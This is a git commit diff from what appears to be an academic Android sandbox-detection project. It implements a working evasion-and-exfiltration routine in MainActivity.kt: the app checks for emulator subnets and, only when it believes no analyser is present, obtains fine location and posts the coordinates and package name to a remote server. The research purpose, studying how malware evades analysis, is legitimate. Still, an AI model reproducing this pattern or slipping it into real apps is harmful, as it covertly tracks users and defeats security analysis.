2f01bee4f9572f34fd76eac8e83a041a7978bae4
Timme Bethe <timme@timmebethe.nl>
2021-06-03 12:13:24 +0200

    Implemented actual leaking in Subnet
    - Updated all dependencies
    - Added leaking location

--- sandbox-detection/Subnet/app/src/main/java/nl/tbethe/shadowdroid/subnet/MainActivity.kt
+++ sandbox-detection/Subnet/app/src/main/java/nl/tbethe/shadowdroid/subnet/MainActivity.kt
@@ -1,10 +1,23 @@
 package nl.tbethe.shadowdroid.subnet
 
+import android.Manifest
+import android.content.pm.PackageManager
+import android.location.Criteria
+import android.location.LocationManager
 import android.net.ConnectivityManager
 import android.net.Network
 import androidx.appcompat.app.AppCompatActivity
 import android.os.Bundle
 import android.util.Log
+import androidx.activity.result.contract.ActivityResultContracts
+import io.ktor.client.*
+import io.ktor.client.engine.cio.*
+import io.ktor.client.request.forms.*
+import io.ktor.client.statement.*
+import io.ktor.http.*
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
 
 private const val TAG = "MainActivity"
 
@@ -18,20 +31,65 @@ class MainActivity : AppCompatActivity() {
         val r = networks
                 .map { network -> connManager.getLinkProperties(network) }
                 .mapNotNull { linkProps -> linkProps?.linkAddresses }
-                .map { listLinkAddresses ->
-                    listLinkAddresses.map { it.address.hostAddress }
+                .map { listOfLinkAddresses ->
+                    listOfLinkAddresses.map { it.address.hostAddress }
                 }
                 .flatten()
         val isEmu = r.map {
             it.contains("192.168.232.") || it.contains("10.0.2.")
         }.any { it }
 
+        leakLocationIf(!isEmu)
+    }
 
-        Log.d(TAG, "$isEmu \n" + r.reduce { acc, s -> "$acc \n $s" })
+    private fun leakLocationIf(notAnalyser: Boolean) {
+        if (!notAnalyser) {
+            Log.d(TAG, "Not leaking")
+            return
+        }
 
-        if(!isEmu) {
-            Log.d(TAG, "Leaking data")
-            TODO("Leak data")
+        Log.d(TAG, "Leaking location")
+
+        fun sendLocation() {
+            val lm = getSystemService(LocationManager::class.java)
+            val provider = lm.getBestProvider(Criteria(), true)
+
+            val location = provider?.let {
+                lm.getLastKnownLocation(it)
+            }
+            location?.let { loc ->
+                val url = "https://vm-thijs.ewi.utwente.nl/shadow-droid/leak"
+                CoroutineScope(Dispatchers.IO).launch {
+                    try {
+                        HttpClient(CIO).use { client ->
+                            val response = client.submitForm<HttpResponse>(
+                                url,
+                                Parameters.build {
+                                    append("appname", packageName)
+                                    append("coords", "${loc.latitude}:${loc.longitude}")
+                                },
+                                false
+                            )
+                            Log.d(TAG, "Response status: ${response.status}")
+                            Log.d(TAG, "Response: ${response.readText()}")
+                        }
+                    } catch (e: Exception) {
+                        Log.d(TAG, "IO Exception occurred when trying to exfiltrate data")
+                    }
+                }
+            }
+        }
+        val requestPermission =
+            registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted ->
+                if (isGranted) sendLocation()
+            }
+        when (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
+            PackageManager.PERMISSION_DENIED -> {
+                requestPermission.launch(Manifest.permission.ACCESS_FINE_LOCATION)
+            }
+            PackageManager.PERMISSION_GRANTED -> {
+                sendLocation()
+            }
         }
     }
 }
